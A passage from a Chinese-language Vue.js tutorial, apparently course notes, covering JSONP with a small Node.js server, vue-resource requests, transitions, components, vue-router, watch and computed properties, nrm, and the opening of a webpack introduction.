数据接口，浏览器认为这种访问不安全；</p></li><li><p>可以通过动态创建script标签的形式，把script标签的src属性，指向数据接口的地址，因为script标签不存在跨域限制，这种数据获取方式，称作JSONP（注意：根据JSONP的实现原理，知晓，JSONP只支持Get请求）；</p></li><li><p>具体实现过程：</p><ul><li>先在客户端定义一个回调方法，预定义对数据的操作；</li><li>再把这个回调方法的名称，通过URL传参的形式，提交到服务器的数据接口；</li><li>服务器数据接口组织好要发送给客户端的数据，再拿着客户端传递过来的回调方法名称，拼接出一个调用这个方法的字符串，发送给客户端去解析执行；</li><li>客户端拿到服务器返回的字符串之后，当作Script脚本去解析执行，这样就能够拿到JSONP的数据了；</li></ul></li><li><p>带大家通过 Node.js ，来手动实现一个JSONP的请求例子；</p><pre><code>const http = require('http');// 导入解析 URL 地址的核心模块const urlModule = require('url');const server = http.createServer();// 监听 服务器的 request 请求事件，处理每个请求server.on('request', (req, res) =&gt; { const url = req.url; // 解析客户端请求的URL地址 var info = urlModule.parse(url, true); // 如果请求的 URL 地址是 /getjsonp ，则表示要获取JSONP类型的数据 if (info.pathname === '/getjsonp') {   // 获取客户端指定的回调函数的名称   var cbName = info.query.callback;   // 手动拼接要返回给客户端的数据对象   var data = {     name: 'zs',     age: 22,     gender: '男',     hobby: ['吃饭', '睡觉', '运动']   }   // 拼接出一个方法的调用，在调用这个方法的时候，把要发送给客户端的数据，序列化为字符串，作为参数传递给这个调用的方法：   var result = `${cbName}(${JSON.stringify(data)})`;   // 将拼接好的方法的调用，返回给客户端去解析执行   res.end(result); } else {   res.end('404'); }});server.listen(3000, () =&gt; { console.log('server running at http://127.0.0.1:3000');});</code></pre></li></ul></li><li><p>vue-resource 的配置步骤：</p><ul><li>直接在页面中，通过<code>script</code>标签，引入 <code>vue-resource</code> 的脚本文件；</li><li>注意：引用的先后顺序是：先引用 <code>Vue</code> 的脚本文件，再引用 <code>vue-resource</code> 的脚本文件；</li></ul></li><li><p>发送get请求：</p><pre><code>getInfo() { // get 方式获取数据this.$http.get('http://127.0.0.1:8899/api/getlunbo').then(res =&gt; { console.log(res.body);})}</code></pre></li><li><p>发送post请求：</p><pre><code>postInfo() {var url = 'http://127.0.0.1:8899/api/post';// post 方法接收三个参数：// 参数1： 要请求的URL地址// 参数2： 要发送的数据对象// 参数3： 指定post提交的编码类型为 application/x-www-form-urlencodedthis.$http.post(url, { name: 'zs' }, { emulateJSON: true }).then(res =&gt; { console.log(res.body);});}</code></pre></li><li><p>发送JSONP请求获取数据：</p><pre><code>jsonpInfo() { // JSONP形式从服务器获取数据var url = 'http://127.0.0.1:8899/api/jsonp';this.$http.jsonp(url).then(res =&gt; { console.log(res.body);});}</code></pre></li></ol><h4 id="配置本地数据库和数据接口API"><a href="#配置本地数据库和数据接口API" class="headerlink" title="配置本地数据库和数据接口API"></a>配置本地数据库和数据接口API</h4><ol><li>先解压安装 <code>PHPStudy</code>;</li><li>解压安装 <code>Navicat</code> 这个数据库可视化工具，并激活；</li><li>打开 <code>Navicat</code> 工具，新建空白数据库，名为 <code>dtcmsdb4</code>;</li><li>双击新建的数据库，连接上这个空白数据库，在新建的数据库上<code>右键</code> -&gt; <code>运行SQL文件</code>，选择并执行 <code>dtcmsdb4.sql</code> 这个数据库脚本文件；如果执行不报错，则数据库导入完成；</li><li>进入文件夹 <code>vuecms3_nodejsapi</code> 内部，执行 <code>npm i</code> 安装所有的依赖项；</li><li>先确保本机安装了 <code>nodemon</code>, 没有安装，则运行 <code>npm i nodemon -g</code> 进行全局安装，安装完毕后，进入到 <code>vuecms3_nodejsapi</code>目录 -&gt; <code>src</code>目录 -&gt; 双击运行 <code>start.bat</code></li><li>如果API启动失败，请检查 PHPStudy 是否正常开启，同时，检查 <code>app.js</code> 中第 <code>14行</code> 中数据库连接配置字符串是否正确；PHPStudy 中默认的 用户名是root，默认的密码也是root</li></ol><h4 id="品牌管理改造"><a href="#品牌管理改造" class="headerlink" title="品牌管理改造"></a>品牌管理改造</h4><h6 id="展示品牌列表"><a href="#展示品牌列表" class="headerlink" title="展示品牌列表"></a>展示品牌列表</h6><h6 id="添加品牌数据"><a href="#添加品牌数据" class="headerlink" title="添加品牌数据"></a>添加品牌数据</h6><h6 id="删除品牌数据"><a href="#删除品牌数据" class="headerlink" title="删除品牌数据"></a>删除品牌数据</h6><h4 id="Vue中的动画"><a href="#Vue中的动画" class="headerlink" title="Vue中的动画"></a><a href="https://cn.vuejs.org/v2/guide/transitions.html" target="_blank" rel="noopener">Vue中的动画</a></h4><p>为什么要有动画：动画能够提高用户的体验，帮助用户更好的理解页面中的功能；</p><h6 id="使用过渡类名"><a href="#使用过渡类名" class="headerlink" title="使用过渡类名"></a>使用过渡类名</h6><ol><li><p>HTML结构：</p><pre><code>&lt;div id="app"&gt; &lt;input type="button" value="动起来" @click="myAnimate"&gt; &lt;!-- 使用 transition 将需要过渡的元素包裹起来 --&gt; &lt;transition name="fade"&gt;   &lt;div v-show="isshow"&gt;动画哦&lt;/div&gt; &lt;/transition&gt;&lt;/div&gt;</code></pre></li><li><p>VM 实例：</p><pre><code>// 创建 Vue 实例，得到 ViewModelvar vm = new Vue({el: '##app',data: { isshow: false},methods: { myAnimate() {   this.isshow = !this.isshow; }}});</code></pre></li><li><p>定义两组类样式：</p><pre><code>/* 定义进入和离开时候的过渡状态 */ .fade-enter-active, .fade-leave-active {   transition: all 0.2s ease;   position: absolute; } /* 定义进入过渡的开始状态 和 离开过渡的结束状态 */ .fade-enter, .fade-leave-to {   opacity: 0;   transform: translateX(100px); }</code></pre></li></ol><h6 id="使用第三方-CSS-动画库"><a href="#使用第三方-CSS-动画库" class="headerlink" title="使用第三方 CSS 动画库"></a><a href="https://cn.vuejs.org/v2/guide/transitions.html##自定义过渡类名" target="_blank" rel="noopener">使用第三方 CSS 动画库</a></h6><ol><li>导入动画类库：<pre><code>&lt;link rel="stylesheet" type="text/css" href="./lib/animate.css"&gt;</code></pre></li><li>定义 transition 及属性：<pre><code>&lt;transition enter-active-class="fadeInRight" leave-active-class="fadeOutRight" :duration="{ enter: 500, leave: 800 }"&gt;   &lt;div class="animated" v-show="isshow"&gt;动画哦&lt;/div&gt;&lt;/transition&gt;</code></pre></li></ol><h6 id="使用动画钩子函数"><a href="#使用动画钩子函数" class="headerlink" title="使用动画钩子函数"></a>使用动画钩子函数</h6><ol><li>定义 transition 组件以及三个钩子函数：<pre><code>&lt;div id="app"&gt; &lt;input type="button" value="切换动画" @click="isshow = !isshow"&gt; &lt;transition @before-enter="beforeEnter" @enter="enter" @after-enter="afterEnter"&gt;   &lt;div v-if="isshow" class="show"&gt;OK&lt;/div&gt; &lt;/transition&gt;&lt;/div&gt;</code></pre></li><li>定义三个 methods 钩子方法：<pre><code>methods: {     beforeEnter(el) { // 动画进入之前的回调       el.style.transform = 'translateX(500px)';     },     enter(el, done) { // 动画进入完成时候的回调       el.offsetWidth;       el.style.transform = 'translateX(0px)';       done();     },     afterEnter(el) { // 动画进入完成之后的回调       this.isshow = !this.isshow;     }   }</code></pre></li><li>定义动画过渡时长和样式：<pre><code>.show{   transition: all 0.4s ease; }</code></pre></li></ol><h6 id="v-for-的列表过渡"><a href="#v-for-的列表过渡" class="headerlink" title="v-for 的列表过渡"></a><a href="https://cn.vuejs.org/v2/guide/transitions.html##列表的进入和离开过渡" target="_blank" rel="noopener">v-for 的列表过渡</a></h6><ol><li><p>定义过渡样式：</p><pre><code>&lt;style&gt; .list-enter, .list-leave-to {   opacity: 0;   transform: translateY(10px); } .list-enter-active, .list-leave-active {   transition: all 0.3s ease; }&lt;/style&gt;</code></pre></li><li><p>定义DOM结构，其中，需要使用 transition-group 组件把v-for循环的列表包裹起来：</p><pre><code>&lt;div id="app"&gt; &lt;input type="text" v-model="txt" @keyup.enter="add"&gt; &lt;transition-group tag="ul" name="list"&gt;   &lt;li v-for="(item, i) in list" :key="i"&gt;{{item}}&lt;/li&gt; &lt;/transition-group&gt;&lt;/div&gt;</code></pre></li><li><p>定义 VM中的结构：</p><pre><code> // 创建 Vue 实例，得到 ViewModel var vm = new Vue({   el: '##app',   data: {     txt: '',     list: [1, 2, 3, 4]   },   methods: {     add() {       this.list.push(this.txt);       this.txt = '';     }   } });</code></pre></li></ol><h6 id="列表的排序过渡"><a href="#列表的排序过渡" class="headerlink" title="列表的排序过渡"></a>列表的排序过渡</h6><p><code>&lt;transition-group&gt;</code> 组件还有一个特殊之处。不仅可以进入和离开动画，<strong>还可以改变定位</strong>。要使用这个新功能只需了解新增的 <code>v-move</code> 特性，<strong>它会在元素的改变定位的过程中应用</strong>。</p><ul><li><code>v-move</code> 和 <code>v-leave-active</code> 结合使用，能够让列表的过渡更加平缓柔和：<pre><code>.v-move{transition: all 0.8s ease;}.v-leave-active{position: absolute;}</code></pre></li></ul><h2 id="Vue-js-Day3"><a href="#Vue-js-Day3" class="headerlink" title="Vue.js - Day3"></a>Vue.js - Day3</h2><h4 id="定义Vue组件"><a href="#定义Vue组件" class="headerlink" title="定义Vue组件"></a>定义Vue组件</h4><p>什么是组件： 组件的出现，就是为了拆分Vue实例的代码量的，能够让我们以不同的组件，来划分不同的功能模块，将来我们需要什么样的功能，就可以去调用对应的组件即可；<br>组件化和模块化的不同：</p><ul><li>模块化： 是从代码逻辑的角度进行划分的；方便代码分层开发，保证每个功能模块的职能单一；</li><li>组件化： 是从UI界面的角度进行划分的；前端的组件化，方便UI组件的重用；<h6 id="全局组件定义的三种方式"><a href="#全局组件定义的三种方式" class="headerlink" title="全局组件定义的三种方式"></a>全局组件定义的三种方式</h6><ol><li>使用 Vue.extend 配合 Vue.component 方法：<pre><code>var login = Vue.extend({template: '&lt;h1&gt;登录&lt;/h1&gt;'});Vue.component('login', login);</code></pre></li><li>直接使用 Vue.component 方法：<pre><code>Vue.component('register', {template: '&lt;h1&gt;注册&lt;/h1&gt;'});</code></pre></li><li>将模板字符串，定义到script标签种：<pre><code>&lt;script id="tmpl" type="x-template"&gt;&lt;div&gt;&lt;a href="##"&gt;登录&lt;/a&gt; | &lt;a href="##"&gt;注册&lt;/a&gt;&lt;/div&gt;&lt;/script&gt;</code></pre>同时，需要使用 Vue.component 来定义组件：<pre><code>Vue.component('account', {template: '##tmpl'});</code></pre></li></ol></li></ul><blockquote><p>注意： 组件中的DOM结构，有且只能有唯一的根元素（Root Element）来进行包裹！</p></blockquote><h6 id="组件中展示数据和响应事件"><a href="#组件中展示数据和响应事件" class="headerlink" title="组件中展示数据和响应事件"></a>组件中展示数据和响应事件</h6><ol><li>在组件中，<code>data</code>需要被定义为一个方法，例如：<pre><code>Vue.component('account', {   template: '##tmpl',   data() {     return {       msg: '大家好！'     }   },   methods:{     login(){       alert('点击了登录按钮');     }   } });</code></pre></li><li>在子组件中，如果将模板字符串，定义到了script标签中，那么，要访问子组件身上的<code>data</code>属性中的值，需要使用<code>this</code>来访问；</li></ol><h6 id="【重点】为什么组件中的data属性必须定义为一个方法并返回一个对象"><a href="#【重点】为什么组件中的data属性必须定义为一个方法并返回一个对象" class="headerlink" title="【重点】为什么组件中的data属性必须定义为一个方法并返回一个对象"></a>【重点】为什么组件中的data属性必须定义为一个方法并返回一个对象</h6><ol><li>通过计数器案例演示</li></ol><h6 id="使用components属性定义局部子组件"><a href="#使用components属性定义局部子组件" class="headerlink" title="使用components属性定义局部子组件"></a>使用<code>components</code>属性定义局部子组件</h6><ol><li>组件实例定义方式：<pre><code>&lt;script&gt; // 创建 Vue 实例，得到 ViewModel var vm = new Vue({   el: '##app',   data: {},   methods: {},   components: { // 定义子组件     account: { // account 组件       template: '&lt;div&gt;&lt;h1&gt;这是Account组件{{name}}&lt;/h1&gt;&lt;login&gt;&lt;/login&gt;&lt;/div&gt;', // 在这里使用定义的子组件       components: { // 定义子组件的子组件         login: { // login 组件           template: "&lt;h3&gt;这是登录组件&lt;/h3&gt;"         }       }     }   } });&lt;/script&gt;</code></pre></li><li>引用组件：<pre><code>&lt;div id="app"&gt; &lt;account&gt;&lt;/account&gt;&lt;/div&gt;</code></pre></li></ol><h4 id="使用flag标识符结合v-if和v-else切换组件"><a href="#使用flag标识符结合v-if和v-else切换组件" class="headerlink" title="使用flag标识符结合v-if和v-else切换组件"></a>使用<code>flag</code>标识符结合<code>v-if</code>和<code>v-else</code>切换组件</h4><ol><li><p>页面结构：</p><pre><code>&lt;div id="app"&gt; &lt;input type="button" value="toggle" @click="flag=!flag"&gt; &lt;my-com1 v-if="flag"&gt;&lt;/my-com1&gt; &lt;my-com2 v-else="flag"&gt;&lt;/my-com2&gt;&lt;/div&gt;</code></pre></li><li><p>Vue实例定义：</p><pre><code>&lt;script&gt; Vue.component('myCom1', {   template: '&lt;h3&gt;奔波霸&lt;/h3&gt;' }) Vue.component('myCom2', {   template: '&lt;h3&gt;霸波奔&lt;/h3&gt;' }) // 创建 Vue 实例，得到 ViewModel var vm = new Vue({   el: '##app',   data: {     flag: true   },   methods: {} });&lt;/script&gt;</code></pre></li></ol><h4 id="使用-is属性来切换不同的子组件-并添加切换动画"><a href="#使用-is属性来切换不同的子组件-并添加切换动画" class="headerlink" title="使用:is属性来切换不同的子组件,并添加切换动画"></a>使用<code>:is</code>属性来切换不同的子组件,并添加切换动画</h4><ol><li><p>组件实例定义方式：</p><pre><code>// 登录组件 const login = Vue.extend({   template: `&lt;div&gt;     &lt;h3&gt;登录组件&lt;/h3&gt;   &lt;/div&gt;` }); Vue.component('login', login); // 注册组件 const register = Vue.extend({   template: `&lt;div&gt;     &lt;h3&gt;注册组件&lt;/h3&gt;   &lt;/div&gt;` }); Vue.component('register', register); // 创建 Vue 实例，得到 ViewModel var vm = new Vue({   el: '##app',   data: { comName: 'login' },   methods: {} });</code></pre></li><li><p>使用<code>component</code>标签，来引用组件，并通过<code>:is</code>属性来指定要加载的组件：</p><pre><code>&lt;div id="app"&gt; &lt;a href="##" @click.prevent="comName='login'"&gt;登录&lt;/a&gt; &lt;a href="##" @click.prevent="comName='register'"&gt;注册&lt;/a&gt; &lt;hr&gt; &lt;transition mode="out-in"&gt;   &lt;component :is="comName"&gt;&lt;/component&gt; &lt;/transition&gt;&lt;/div&gt;</code></pre></li><li><p>添加切换样式：</p><pre><code>&lt;style&gt; .v-enter, .v-leave-to {   opacity: 0;   transform: translateX(30px); } .v-enter-active, .v-leave-active {   position: absolute;   transition: all 0.3s ease; } h3{   margin: 0; }&lt;/style&gt;</code></pre></li></ol><h4 id="父组件向子组件传值"><a href="#父组件向子组件传值" class="headerlink" title="父组件向子组件传值"></a>父组件向子组件传值</h4><ol><li>组件实例定义方式，注意：一定要使用<code>props</code>属性来定义父组件传递过来的数据<pre><code>&lt;script&gt; // 创建 Vue 实例，得到 ViewModel var vm = new Vue({   el: '##app',   data: {     msg: '这是父组件中的消息'   },   components: {     son: {       template: '&lt;h1&gt;这是子组件 --- {{finfo}}&lt;/h1&gt;',       props: ['finfo']     }   } });&lt;/script&gt;</code></pre></li><li>使用<code>v-bind</code>或简化指令，将数据传递到子组件中：<pre><code>&lt;div id="app"&gt; &lt;son :finfo="msg"&gt;&lt;/son&gt;&lt;/div&gt;</code></pre></li></ol><h4 id="子组件向父组件传值"><a href="#子组件向父组件传值" class="headerlink" title="子组件向父组件传值"></a>子组件向父组件传值</h4><ol><li><p>原理：父组件将方法的引用，传递到子组件内部，子组件在内部调用父组件传递过来的方法，同时把要发送给父组件的数据，在调用方法的时候当作参数传递进去；</p></li><li><p>父组件将方法的引用传递给子组件，其中，<code>getMsg</code>是父组件中<code>methods</code>中定义的方法名称，<code>func</code>是子组件调用传递过来方法时候的方法名称</p><pre><code>&lt;son @func="getMsg"&gt;&lt;/son&gt;</code></pre></li><li><p>子组件内部通过<code>this.$emit('方法名', 要传递的数据)</code>方式，来调用父组件中的方法，同时把数据传递给父组件使用</p><pre><code>&lt;div id="app"&gt; &lt;!-- 引用父组件 --&gt; &lt;son @func="getMsg"&gt;&lt;/son&gt; &lt;!-- 组件模板定义 --&gt; &lt;script type="x-template" id="son"&gt;   &lt;div&gt;     &lt;input type="button" value="向父组件传值" @click="sendMsg" /&gt;   &lt;/div&gt; &lt;/script&gt;&lt;/div&gt;&lt;script&gt; // 子组件的定义方式 Vue.component('son', {   template: '##son', // 组件模板Id   methods: {     sendMsg() { // 按钮的点击事件       this.$emit('func', 'OK'); // 调用父组件传递过来的方法，同时把数据传递出去     }   } }); // 创建 Vue 实例，得到 ViewModel var vm = new Vue({   el: '##app',   data: {},   methods: {     getMsg(val){ // 子组件中，通过 this.$emit() 实际调用的方法，在此进行定义       alert(val);     }   } });&lt;/script&gt;</code></pre></li></ol><h4 id="评论列表案例"><a href="#评论列表案例" class="headerlink" title="评论列表案例"></a>评论列表案例</h4><p>目标：主要练习父子组件之间传值</p><h4 id="使用-this-refs-来获取元素和组件"><a href="#使用-this-refs-来获取元素和组件" class="headerlink" title="使用 this.$refs 来获取元素和组件"></a>使用 <code>this.$refs</code> 来获取元素和组件</h4><pre><code>  &lt;div id="app"&gt;    &lt;div&gt;      &lt;input type="button" value="获取元素内容" @click="getElement" /&gt;      &lt;!-- 使用 ref 获取元素 --&gt;      &lt;h1 ref="myh1"&gt;这是一个大大的H1&lt;/h1&gt;      &lt;hr&gt;      &lt;!-- 使用 ref 获取子组件 --&gt;      &lt;my-com ref="mycom"&gt;&lt;/my-com&gt;    &lt;/div&gt;  &lt;/div&gt;  &lt;script&gt;    Vue.component('my-com', {      template: '&lt;h5&gt;这是一个子组件&lt;/h5&gt;',      data() {        return {          name: '子组件'        }      }    });    // 创建 Vue 实例，得到 ViewModel    var vm = new Vue({      el: '##app',      data: {},      methods: {        getElement() {          // 通过 this.$refs 来获取元素          console.log(this.$refs.myh1.innerText);          // 通过 this.$refs 来获取组件          console.log(this.$refs.mycom.name);        }      }    });  &lt;/script&gt;</code></pre><h4 id="什么是路由"><a href="#什么是路由" class="headerlink" title="什么是路由"></a>什么是路由</h4><ol><li><p>对于普通的网站，所有的超链接都是URL地址，所有的URL地址都对应服务器上对应的资源；</p></li><li><p>对于单页面应用程序来说，主要通过URL中的hash(##号)来实现不同页面之间的切换，同时，hash有一个特点：HTTP请求中不会包含hash相关的内容；所以，单页面程序中的页面跳转主要用hash实现；</p></li><li><p>在单页面应用程序中，这种通过hash改变来切换页面的方式，称作前端路由（区别于后端路由）；</p></li></ol><h4 id="在-vue-中使用-vue-router"><a href="#在-vue-中使用-vue-router" class="headerlink" title="在 vue 中使用 vue-router"></a>在 vue 中使用 vue-router</h4><ol><li><p>导入 vue-router 组件类库：</p><pre><code>&lt;!-- 1. 导入 vue-router 组件类库 --&gt;&lt;script src="./lib/vue-router-2.7.0.js"&gt;&lt;/script&gt;</code></pre></li><li><p>使用 router-link 组件来导航</p><pre><code>&lt;!-- 2. 使用 router-link 组件来导航 --&gt;&lt;router-link to="/login"&gt;登录&lt;/router-link&gt;&lt;router-link to="/register"&gt;注册&lt;/router-link&gt;</code></pre></li><li><p>使用 router-view 组件来显示匹配到的组件</p><pre><code>&lt;!-- 3. 使用 router-view 组件来显示匹配到的组件 --&gt;&lt;router-view&gt;&lt;/router-view&gt;</code></pre></li><li><p>创建使用<code>Vue.extend</code>创建组件</p><pre><code> // 4.1 使用 Vue.extend 来创建登录组件 var login = Vue.extend({   template: '&lt;h1&gt;登录组件&lt;/h1&gt;' }); // 4.2 使用 Vue.extend 来创建注册组件 var register = Vue.extend({   template: '&lt;h1&gt;注册组件&lt;/h1&gt;' });</code></pre></li><li><p>创建一个路由 router 实例，通过 routers 属性来定义路由匹配规则</p><pre><code>// 5. 创建一个路由 router 实例，通过 routers 属性来定义路由匹配规则 var router = new VueRouter({   routes: [     { path: '/login', component: login },     { path: '/register', component: register }   ] });</code></pre></li><li><p>使用 router 属性来使用路由规则</p><pre><code>// 6. 创建 Vue 实例，得到 ViewModel var vm = new Vue({   el: '##app',   router: router // 使用 router 属性来使用路由规则 });</code></pre></li></ol><h4 id="设置路由高亮"><a href="#设置路由高亮" class="headerlink" title="设置路由高亮"></a>设置路由高亮</h4><h4 id="设置路由切换动效"><a href="#设置路由切换动效" class="headerlink" title="设置路由切换动效"></a>设置路由切换动效</h4><h4 id="在路由规则中定义参数"><a href="#在路由规则中定义参数" class="headerlink" title="在路由规则中定义参数"></a>在路由规则中定义参数</h4><ol><li>在规则中定义参数：<pre><code>{ path: '/register/:id', component: register }</code></pre></li><li>通过 <code>this.$route.params</code>来获取路由中的参数：<pre><code>var register = Vue.extend({   template: '&lt;h1&gt;注册组件 --- {{this.$route.params.id}}&lt;/h1&gt;' });</code></pre></li></ol><h4 id="使用-children-属性实现路由嵌套"><a href="#使用-children-属性实现路由嵌套" class="headerlink" title="使用 children 属性实现路由嵌套"></a>使用 <code>children</code> 属性实现路由嵌套</h4><pre><code>  &lt;div id="app"&gt;    &lt;router-link to="/account"&gt;Account&lt;/router-link&gt;    &lt;router-view&gt;&lt;/router-view&gt;  &lt;/div&gt;  &lt;script&gt;    // 父路由中的组件    const account = Vue.extend({      template: `&lt;div&gt;        这是account组件        &lt;router-link to="/account/login"&gt;login&lt;/router-link&gt; |         &lt;router-link to="/account/register"&gt;register&lt;/router-link&gt;        &lt;router-view&gt;&lt;/router-view&gt;      &lt;/div&gt;`    });    // 子路由中的 login 组件    const login = Vue.extend({      template: '&lt;div&gt;登录组件&lt;/div&gt;'    });    // 子路由中的 register 组件    const register = Vue.extend({      template: '&lt;div&gt;注册组件&lt;/div&gt;'    });    // 路由实例    var router = new VueRouter({      routes: [        { path: '/', redirect: '/account/login' }, // 使用 redirect 实现路由重定向        {          path: '/account',          component: account,          children: [ // 通过 children 数组属性，来实现路由的嵌套            { path: 'login', component: login }, // 注意，子路由的开头位置，不要加 / 路径符            { path: 'register', component: register }          ]        }      ]    });    // 创建 Vue 实例，得到 ViewModel    var vm = new Vue({      el: '##app',      data: {},      methods: {},      components: {        account      },      router: router    });  &lt;/script&gt;</code></pre><h4 id="命名视图实现经典布局"><a href="#命名视图实现经典布局" class="headerlink" title="命名视图实现经典布局"></a>命名视图实现经典布局</h4><ol><li><p>标签代码结构：</p><pre><code>&lt;div id="app"&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;div class="content"&gt;   &lt;router-view name="a"&gt;&lt;/router-view&gt;   &lt;router-view name="b"&gt;&lt;/router-view&gt; &lt;/div&gt;&lt;/div&gt;</code></pre></li><li><p>JS代码：</p><pre><code>&lt;script&gt; var header = Vue.component('header', {   template: '&lt;div class="header"&gt;header&lt;/div&gt;' }); var sidebar = Vue.component('sidebar', {   template: '&lt;div class="sidebar"&gt;sidebar&lt;/div&gt;' }); var mainbox = Vue.component('mainbox', {   template: '&lt;div class="mainbox"&gt;mainbox&lt;/div&gt;' }); // 创建路由对象 var router = new VueRouter({   routes: [     {       path: '/', components: {         default: header,         a: sidebar,         b: mainbox       }     }   ] }); // 创建 Vue 实例，得到 ViewModel var vm = new Vue({   el: '##app',   data: {},   methods: {},   router });&lt;/script&gt;</code></pre></li><li><p>CSS 样式：</p><pre><code>&lt;style&gt; .header {   border: 1px solid red; } .content{   display: flex; } .sidebar {   flex: 2;   border: 1px solid green;   height: 500px; } .mainbox{   flex: 8;   border: 1px solid blue;   height: 500px; }&lt;/style&gt;</code></pre></li></ol><h4 id="watch属性的使用"><a href="#watch属性的使用" class="headerlink" title="watch属性的使用"></a><code>watch</code>属性的使用</h4><p>考虑一个问题：想要实现 <code>名</code> 和 <code>姓</code> 两个文本框的内容改变，则全名的文本框中的值也跟着改变；（用以前的知识如何实现？？？）</p><ol><li><p>监听<code>data</code>中属性的改变：</p><pre><code>&lt;div id="app"&gt; &lt;input type="text" v-model="firstName"&gt; + &lt;input type="text" v-model="lastName"&gt; = &lt;span&gt;{{fullName}}&lt;/span&gt;&lt;/div&gt;&lt;script&gt; // 创建 Vue 实例，得到 ViewModel var vm = new Vue({   el: '##app',   data: {     firstName: 'jack',     lastName: 'chen',     fullName: 'jack - chen'   },   methods: {},   watch: {     'firstName': function (newVal, oldVal) { // 第一个参数是新数据，第二个参数是旧数据       this.fullName = newVal + ' - ' + this.lastName;     },     'lastName': function (newVal, oldVal) {       this.fullName = this.firstName + ' - ' + newVal;     }   } });&lt;/script&gt;</code></pre></li><li><p>监听路由对象的改变：</p><pre><code>&lt;div id="app"&gt; &lt;router-link to="/login"&gt;登录&lt;/router-link&gt; &lt;router-link to="/register"&gt;注册&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt;&lt;script&gt; var login = Vue.extend({   template: '&lt;h1&gt;登录组件&lt;/h1&gt;' }); var register = Vue.extend({   template: '&lt;h1&gt;注册组件&lt;/h1&gt;' }); var router = new VueRouter({   routes: [     { path: "/login", component: login },     { path: "/register", component: register }   ] }); // 创建 Vue 实例，得到 ViewModel var vm = new Vue({   el: '##app',   data: {},   methods: {},   router: router,   watch: {     '$route': function (newVal, oldVal) {       if (newVal.path === '/login') {         console.log('这是登录组件');       }     }   } });&lt;/script&gt;</code></pre></li></ol><h4 id="computed计算属性的使用"><a href="#computed计算属性的使用" class="headerlink" title="computed计算属性的使用"></a><code>computed</code>计算属性的使用</h4><ol><li><p>默认只有<code>getter</code>的计算属性：</p><pre><code>&lt;div id="app"&gt; &lt;input type="text" v-model="firstName"&gt; + &lt;input type="text" v-model="lastName"&gt; = &lt;span&gt;{{fullName}}&lt;/span&gt;&lt;/div&gt;&lt;script&gt; // 创建 Vue 实例，得到 ViewModel var vm = new Vue({   el: '##app',   data: {     firstName: 'jack',     lastName: 'chen'   },   methods: {},   computed: { // 计算属性； 特点：当计算属性中所以来的任何一个 data 属性改变之后，都会重新触发 本计算属性 的重新计算，从而更新 fullName 的值     fullName() {       return this.firstName + ' - ' + this.lastName;     }   } });&lt;/script&gt;</code></pre></li><li><p>定义有<code>getter</code>和<code>setter</code>的计算属性：</p><pre><code>&lt;div id="app"&gt; &lt;input type="text" v-model="firstName"&gt; &lt;input type="text" v-model="lastName"&gt; &lt;!-- 点击按钮重新为 计算属性 fullName 赋值 --&gt; &lt;input type="button" value="修改fullName" @click="changeName"&gt; &lt;span&gt;{{fullName}}&lt;/span&gt;&lt;/div&gt;&lt;script&gt; // 创建 Vue 实例，得到 ViewModel var vm = new Vue({   el: '##app',   data: {     firstName: 'jack',     lastName: 'chen'   },   methods: {     changeName() {       this.fullName = 'TOM - chen2';     }   },   computed: {     fullName: {       get: function () {         return this.firstName + ' - ' + this.lastName;       },       set: function (newVal) {         var parts = newVal.split(' - ');         this.firstName = parts[0];         this.lastName = parts[1];       }     }   } });&lt;/script&gt;</code></pre></li></ol><h4 id="watch、computed和methods之间的对比"><a href="#watch、computed和methods之间的对比" class="headerlink" title="watch、computed和methods之间的对比"></a><code>watch</code>、<code>computed</code>和<code>methods</code>之间的对比</h4><ol><li><code>computed</code>属性的结果会被缓存，除非依赖的响应式属性变化才会重新计算。主要当作属性来使用；</li><li><code>methods</code>方法表示一个具体的操作，主要书写业务逻辑；</li><li><code>watch</code>一个对象，键是需要观察的表达式，值是对应回调函数。主要用来监听某些特定数据的变化，从而进行某些具体的业务逻辑操作；可以看作是<code>computed</code>和<code>methods</code>的结合体；</li></ol><h4 id="nrm的安装使用"><a href="#nrm的安装使用" class="headerlink" title="nrm的安装使用"></a><code>nrm</code>的安装使用</h4><p>作用：提供了一些最常用的NPM包镜像地址，能够让我们快速的切换安装包时候的服务器地址；<br>什么是镜像：原来包刚一开始是只存在于国外的NPM服务器，但是由于网络原因，经常访问不到，这时候，我们可以在国内，创建一个和官网完全一样的NPM服务器，只不过，数据都是从人家那里拿过来的，除此之外，使用方式完全一样；</p><ol><li>运行<code>npm i nrm -g</code>全局安装<code>nrm</code>包；</li><li>使用<code>nrm ls</code>查看当前所有可用的镜像源地址以及当前所使用的镜像源地址；</li><li>使用<code>nrm use npm</code>或<code>nrm use taobao</code>切换不同的镜像源地址；</li></ol><h2 id="Vue-js-Day5-Webpack"><a href="#Vue-js-Day5-Webpack" class="headerlink" title="Vue.js - Day5 - Webpack"></a>Vue.js - Day5 - Webpack</h2><h4 id="在网页中会引用哪些常见的静态资源？"><a href="#在网页中会引用哪些常见的静态资源？" class="headerlink" title="在网页中会引用哪些常见的静态资源？"></a>在网页中会引用哪些常见的静态资源？</h4><ul><li>JS<ul><li>.js  .jsx  .coffee  .ts（TypeScript  类 C## 语言）</li></ul></li><li>CSS<ul><li>.css  .less   .sass  .scss</li></ul></li><li>Images<ul><li>.jpg   .png   .gif   .bmp   .svg</li></ul></li><li>字体文件（Fonts）<ul><li>.svg   .ttf   .eot   .woff   .woff2</li></ul></li><li>模板文件<ul><li>.ejs   .jade  .vue【这是在webpack中定义组件的方式，推荐这么用】</li></ul></li></ul><h4 id="网页中引入的静态资源多了以后有什么问题？？？"><a href="#网页中引入的静态资源多了以后有什么问题？？？" class="headerlink" title="网页中引入的静态资源多了以后有什么问题？？？"></a>网页中引入的静态资源多了以后有什么问题？？？</h4><ol><li>网页加载速度慢， 因为 我们要发起很多的二次请求；</li><li>要处理错综复杂的依赖关系</li></ol><h4 id="如何解决上述两个问题"><a href="#如何解决上述两个问题" class="headerlink" title="如何解决上述两个问题"></a>如何解决上述两个问题</h4><ol><li>合并、压缩、精灵图、图片的Base64编码</li><li>可以使用之前学过的requireJS、也可以使用webpack可以解决各个包之间的复杂依赖关系；</li></ol><h4 id="什么是webpack"><a href="#什么是webpack" class="headerlink" title="什么是webpack?"></a>什么是webpack?</h4><p>webpack 是前端的一个项目构建工具，它是基于 Node.js 开发出来的一个前端工具；</p><h4 id="如何完美实现上述的2种解决方案"><a href="#如何完美实现上述的2种解决方案" class="headerlink" title="如何完美实现上述的2种解决方案"></a>如何完美实现上述的2种解决方案</h4><ol><li>使用Gulp， 